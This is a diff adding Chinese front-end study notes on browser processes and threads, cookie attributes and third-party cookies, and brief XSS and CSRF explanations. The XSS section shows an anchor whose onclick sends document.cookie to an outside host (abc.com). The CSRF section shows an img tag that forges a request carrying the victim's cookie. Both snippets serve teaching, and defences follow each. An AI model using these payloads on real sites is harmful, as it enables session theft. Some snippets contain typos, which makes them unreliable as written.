@@ -529,3 +529,125 @@ css硬件加速
 
 - H5提供postMessage()方法
 
+
+
+### 浏览器进程
+浏览器是多进程的，Chrome每开一个Tab页就新建一个进程
+浏览器有以下进程：
+1. Browser进程：浏览器的主进程，只有一个，作用：
+   - 浏览器页面显示
+   - 浏览器页面管理，创建和销毁其它进程
+   - 将Renderer进程得到的Bitmap绘制到页面上
+   - 网络资源管理
+2. 浏览器插件进程：可以有多个，对应每个插件
+3. GPU进程：用于绘制页面，只有一个
+4. Renderer进程：浏览器渲染进程，内部是多线程的，默认每个Tab页一个进程，主要用来渲染页面，执行脚本和事件处理等
+
+Renderer进程的线程：
+1. GUI渲染线程
+   - 负责渲染浏览器界面，解析HTML、CSS，构建DOM树和RenderObject树，布局和绘制等
+   - 当页面发生重绘和回流时该线程就会执行
+   - 当执行JS脚本时，该进程会挂起
+2. javascript引擎线程
+   - Javascript内核，用于执行js脚本
+   - 只有一个js线程
+   - 由于该线程与渲染线程互斥，当JS执行时间过长时，会造成页面卡顿
+3. 定时器触发线程
+   - setInterval与setTimeout所在线程
+   - 不能由js线程管理定时器，因为js线程阻塞会影响时间精度
+4. 事件触发线程
+   - 控制事件轮询
+   - 当脚本代码触发相应事件时（如：click、ajax）会将对应任务添加到该线程
+   - 当对应事件符合执行时机时，该线程会将任务添加到任务队列，等待js引擎执行
+5. http请求线程
+   - 在XMLHttpRequest在连接后是通过浏览器新开一个线程请求
+   - 将检测到状态变更时，如果设置有回调函数，异步线程就产生状态变更事件，将这个回调再放入事件队列中。再由JavaScript引擎执行。
+
+
+
+### 本地存储
+#### cookie
+HTTP是无状态的，服务器无法知道两个请求是否来自同一个浏览器，就增加一个字段表明身份
+当浏览器发送请求时，会先检查是否有相应的cookie，有则自动在请求头添加cookie字段携带cookie
+
+##### 设置cookie
+- 客户端设置
+  ```js
+    document.cookie = 'name=value;expires=date;path=path;domain=domain;secure'
+  ```
+  客户端只能设置以下选项：expires、path、domain、secure，无法设置httponly
+- 服务端设置
+  请求响应头有一个set-cookie字段，用来设置cookie
+  ```js
+    res.setHeader('Set-Cookie', 'name=value;expires=date;path=path;domain=domain;secure')
+  ```
+  可以设置cookie的所有选项，但是每一个set-cookie只能设置一个cookie，要想设置多个cookie，只能设置多个set-cookie字段
+##### 读取
+使用`document.cookie`获取cookie，会得到分号分隔的所有非`httponly`的cookie
+##### 修改
+要想修改cookie，只需要重新赋值，但要注意新cookie的`path/domain`必须与旧cookie相同，否则只是添加一个新的cookie
+##### 删除
+将cookie的过期时间设置为过去的时间，就可以删除cookie，同样，`path/domain`必须与旧cookie相同
+
+##### path 和 domain
+domain指定了cookie会被发送到哪些域中，默认为创建该cookie的域，当请求的域是domain的子域时，才允许cookie
+path为允许请求的路径，当路径匹配时才允许cookie
+| | domain | path |
+|-|-|-|
+| cookie1 | .a.com | / |
+| cookie2 | www.a.com | /b/ |
+| cookie3 | b.a.com | / |
+| cookie4 | www.a.com | / |
+当访问`www.a.com`时
+cookie1会被发送，domain/path都符合
+cookie2不会被发送，path不符合
+cookie3不会被发送，`www.a.com`不是`b.a.com`的子域
+cookie4会被发送，domain/path都符合
+##### cookie的安全性
+- secure选项：当请求时HTTPS或其他安全连接时，才会被发送
+  但是保存在本地的cookie文件并未被加密
+  在http协议的网页中无法设置该字段
+- httponly选项：用来设置cookie是否可以被js访问
+  客户端是不能设置该字段的，只能由服务端通过set-cookie设置
+- samesite选项：限制第三方cookie，他可以设置3个值：
+  - strict：完全禁止第三方cookie，跨站点时不会发送cookie
+  - lax：大多数情况也不发送cookie，但是a标签会发送
+    | 请求类型 | 示例 | 正常情况 | Lax |
+    |-|-|-|-|
+    |链接|`<a href="" />`|true|true|
+    |预加载|`<link rel="prerender" href="" />`|true|true|
+    |GET表单|`<form method="GET action="" />`|true|true|
+    |POST表单|`<form method="POST" action="" />`|true|false|
+    |ifream|`<ifream src="" />`|true|false|
+    |AJAX|get('')|true|false|
+    |img|`<img src="" />`|true|false|
+  - none: 关闭same-site，但要同时设置`secure`,`Set-Cookie: widget_session=abc123; SameSite=None; Secure`
+
+
+##### 第三方cookie
+通常cookie的域和浏览器地址的域匹配，被称为第一方cookie。那么第三方cookie就是cookie的域域地址的域不匹配，这种cookie通常用在第三方广告网站，为了跟踪用户的浏览记录，提供广告服务。
+例如：
+用户访问`www.a.com`，这个网站与`www.ad.com`合作，页面中有`ad.com`的图片，请求这张图片时，`ad.com`就会设置cookie`ser-cookie: name='user';like='1'`
+当用户访问另一个页面时，同样存在`ad.com`的资源，这样在请求该资源时会将之前设置的cookie发送过去，此时`ad.com`就能通过cookie获取到用户的访问记录，然后设置新的cookie，给用户推送广告
+
+storage
+
+
+### 安全
+#### XSS
+使用跨站点脚本可以窃取cookie，当允许js获取cookie时，就会发生攻击者发布恶意代码攻击用户的会话，拿到用户的cookie，例如：
+```html
+<a href="#" onclick=`window.location=http://abc.com?cookie=${docuemnt.cookie}`>领取红包</a>
+```
+当用户点击链接时，就会将cookie发送到`abc.com`
+解决办法：可以设置`httponly`，防止js获取cookie
+
+#### CSRF
+跨站请求伪造
+例如用户在未关闭`a.com`的情况下又访问了`b.com`，`b.com`中如果有一个指向`a.com`的资源：
+```html
+<img src="http://a.com?check?user=a&amount=123" />
+```
+在请求该资源时就会发送`a.com`的cookie，如果`a.com`仅依靠cookie验证身份，那么这次攻击就是成功的
+解决办法：增加其他校验手段
+
